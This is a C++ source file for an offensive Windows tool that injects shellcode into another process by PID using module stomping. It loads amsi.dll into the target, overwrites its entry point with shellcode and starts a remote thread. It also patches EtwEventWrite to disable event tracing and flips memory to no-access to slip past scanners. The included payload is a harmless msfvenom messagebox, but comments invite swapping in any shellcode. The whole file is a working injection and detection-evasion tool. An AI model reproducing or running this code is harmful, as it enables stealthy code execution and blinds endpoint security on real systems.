// module stomping since 98', default uses amsi.dll but pick w.e isn't already loaded and can fit your shellcode

#include <Windows.h>
#include <iostream>
#include <stdio.h>
#include <psapi.h>
#include "allcalls.h"

// msfvenom -p windows/x64/messagebox TEXT=hello TITLE=hello -f c

unsigned char shellcode[] = "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41\x51"
"\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x3e\x48"
"\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72\x50\x3e\x48"
"\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02"
"\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x3e"
"\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48\x01\xd0\x3e\x8b\x80\x88"
"\x00\x00\x00\x48\x85\xc0\x74\x6f\x48\x01\xd0\x50\x3e\x8b\x48"
"\x18\x3e\x44\x8b\x40\x20\x49\x01\xd0\xe3\x5c\x48\xff\xc9\x3e"
"\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41"
"\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24"
"\x08\x45\x39\xd1\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0"
"\x66\x3e\x41\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e"
"\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41"
"\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7\xc1"
"\x00\x00\x00\x00\x3e\x48\x8d\x95\xfe\x00\x00\x00\x3e\x4c\x8d"
"\x85\x04\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83\x56\x07\xff"
"\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2\x56\xff\xd5\x68\x65\x6c"
"\x6c\x6f\x00\x68\x65\x6c\x6c\x6f\x00";

char key[] = "XOR_KEY";

void XOR(char* data, size_t data_len, char* key, size_t key_len) {

    int j;
    j = 0;
    for (int i = 0; i < data_len; i++) {
        if (j == key_len - 1) j = 0;
        data[i] = data[i] ^ key[j];
        j++;
    }
}

void patchETW(LPVOID EEWAddress) {

    HANDLE curproc = GetCurrentProcess();
    UCHAR patch[] = { 0x48, 0x33, 0xc0, 0xc3 }; // x64 Patch [XOR RAX,RAX][RET], for x32 use { 0x33, 0xc0, 0xc2, 0x14, 0x00 } [XOR EAX,EAX][RET]
    size_t size = sizeof(patch);


    LPVOID lpBaseAddress = EEWAddress;
    
    DWORD oldprotect;
    ULONG NewProtection;

    NtProtectVirtualMemory(curproc, &lpBaseAddress, &size, PAGE_READWRITE, &oldprotect);
    NtWriteVirtualMemory(curproc, EEWAddress, (PVOID)patch, sizeof(patch), NULL);
    NtProtectVirtualMemory(curproc, &lpBaseAddress, &size, oldprotect, &NewProtection);

}

void patchETWRemote(HANDLE remoteProc, LPVOID EEWAddress) {

    HANDLE targetProcHandle = remoteProc;

    DWORD oldprotect1;
    ULONG NewProtection1;

    UCHAR patch[] = { 0x48, 0x33, 0xc0, 0xc3 }; // x64 Patch [XOR RAX,RAX][RET], for x32 use { 0x33, 0xc0, 0xc2, 0x14, 0x00 } [XOR EAX,EAX][RET]
    size_t size = sizeof(patch);

    LPVOID lpBaseAddress = EEWAddress;

    NtProtectVirtualMemory(targetProcHandle, &lpBaseAddress, &size, PAGE_READWRITE, &oldprotect1);
    NtWriteVirtualMemory(targetProcHandle, EEWAddress, (PVOID)patch, sizeof(patch), NULL);
    NtProtectVirtualMemory(targetProcHandle, &lpBaseAddress, &size, oldprotect1, &NewProtection1);

}

HANDLE getHandle(int processID) {

    HANDLE targetProcHandle;
    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
    CLIENT_ID cid;
    cid.UniqueProcess = (PVOID)processID;
    cid.UniqueThread = 0;

    NtOpenProcess(&targetProcHandle, PROCESS_ALL_ACCESS, &oa, &cid);

    return targetProcHandle;

}

void calcPrime() {

    int finalPrime = 0;
    int max = 50000; // 50000 = ~12s 100k = ~26
    bool hide = false;

    for (int i = 2; i < max; i++) {

        int latestPrime = 0;
        bool prime = true;
        bool first = true;

        for (int j = 2; j * j <= i; j++)
        {
            if (i % j == 0)
            {
                prime = false;
                if (first == true) {
                    first == false;
                }
                break;
            }
            finalPrime = i;
            std::cout << " ";

            if (hide == false) {
                if (i > 200) {
                    
                    //ShowWindow(GetConsoleWindow(), SW_HIDE);
                    hide = true;

                }   
            }
        }
    }
}

void run(HANDLE processHandle) {

    PVOID remoteBuffer;

    unsigned char moduleToInject[] =  { 'C',':','\\','W','i','n','d','o','w','s','\\','S','y', 's','t','e', 'm', '3', '2' ,'\\', 'a', 'm', 's', 'i', '.', 'd', 'l', 'l', 0x0}; // amsi.dll w.e can fit your shellcode that doesnt already exist

    HMODULE modules[256] = {};
    SIZE_T modulesSize = sizeof(modules);
    DWORD modulesSizeNeeded = 0;
    DWORD moduleNameSize = 0;
    SIZE_T modulesCount = 0;
    CHAR remoteModuleName[128] = {};
    HMODULE remoteModule = NULL;

    SIZE_T sizemod = sizeof(moduleToInject);
    size_t shellsize = sizeof(shellcode);
    SIZE_T byteswritten;
    HANDLE remoteThreadH;
    ULONG old_protect;
    
    //XOR((char*)shellcode, shellcode_len, key, sizeof(key)); // -- XOR Decrypt
    
    NtAllocateVirtualMemory(processHandle, &remoteBuffer, 0, &sizemod, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    NtWriteVirtualMemory(processHandle, remoteBuffer, moduleToInject, sizeof(moduleToInject), &byteswritten);

    NtProtectVirtualMemory(processHandle, &remoteBuffer, &sizemod, PAGE_NOACCESS, &old_protect);

    PTHREAD_START_ROUTINE threadRoutine = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryA");

    HANDLE dllThread;
    NtCreateThreadEx(&dllThread, GENERIC_EXECUTE, NULL, processHandle, threadRoutine, remoteBuffer, TRUE, 0, 0, 0, nullptr); // Create thread suspended

    calcPrime(); // Potentially bypass some memory scanners, since current memory is PAGE_NOACCESS
    
    NtProtectVirtualMemory(processHandle, &remoteBuffer, &sizemod, PAGE_EXECUTE_READ, &old_protect);
    NtResumeThread(dllThread, 0); // Load the DLL
    
    calcPrime(); // In replace of WaitForSingleObject
    
    EnumProcessModules(processHandle, modules, modulesSize, &modulesSizeNeeded);
    modulesCount = modulesSizeNeeded / sizeof(HMODULE);
    for (size_t i = 0; i < modulesCount; i++)
    {
        remoteModule = modules[i];
        GetModuleBaseNameA(processHandle, remoteModule, remoteModuleName, sizeof(remoteModuleName));
        if (std::string(remoteModuleName).compare("amsi.dll") == 0)
        {
            //std::cout << "\n" << remoteModuleName << " at " << modules[i];
            break; // If DLL found, break and use for below
        }

    }

    
    DWORD headerBufferSize = 0x1000;
    LPVOID targetProcessHeaderBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, headerBufferSize);

    NtReadVirtualMemory(processHandle, remoteModule, targetProcessHeaderBuffer, headerBufferSize, NULL);

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)targetProcessHeaderBuffer;
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)targetProcessHeaderBuffer + dosHeader->e_lfanew);

    PVOID dllEntryPoint1 = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (DWORD_PTR)remoteModule); // NtProtectVirtualMemory changes the base address to point to the page start address, so store this value for each call : Write + Thread Creation
    PVOID dllEntryPoint2 = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (DWORD_PTR)remoteModule); // NtProtectVirtualMemory changes the base address to point to the page start address, so store this value for each call : First memory protection change
    PVOID dllEntryPoint3 = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (DWORD_PTR)remoteModule); // NtProtectVirtualMemory changes the base address to point to the page start address, so store this value for each call : Second memory protection change
    PVOID dllEntryPoint4 = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (DWORD_PTR)remoteModule); // NtProtectVirtualMemory changes the base address to point to the page start address, so store this value for each call : Third memory protection change
    
    NtProtectVirtualMemory(processHandle, &dllEntryPoint1, &shellsize, PAGE_READWRITE, &old_protect);

    NtWriteVirtualMemory(processHandle, dllEntryPoint2, &shellcode, sizeof(shellcode), nullptr);

    NtProtectVirtualMemory(processHandle, &dllEntryPoint3, &shellsize, PAGE_NOACCESS, &old_protect);

    NtCreateThreadEx(&remoteThreadH, GENERIC_EXECUTE, NULL, processHandle, (PTHREAD_START_ROUTINE)dllEntryPoint1, NULL, TRUE, 0, 0, 0, nullptr); // Create thread suspended

    calcPrime(); // Potentially bypass some memory scanners, since current memory is PAGE_NOACCESS

    NtProtectVirtualMemory(processHandle, &dllEntryPoint4, &shellsize, PAGE_EXECUTE_READ, &old_protect);

    NtResumeThread(remoteThreadH, 0);

    NtClose(remoteThreadH);
    NtClose(processHandle);
    NtClose(dllThread);
    
}

int main(int argc, char** argv) {

    char* holderID = argv[1];
    int PID = atoi(holderID);
    
    HANDLE processHandle = getHandle(PID);

    unsigned char EEW[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0x0 };
    LPVOID EEWAddress = GetProcAddress(GetModuleHandle("ntdll.dll"), (LPCSTR)EEW);

    patchETW(EEWAddress);
    patchETWRemote(processHandle, EEWAddress);
    run(processHandle);

}
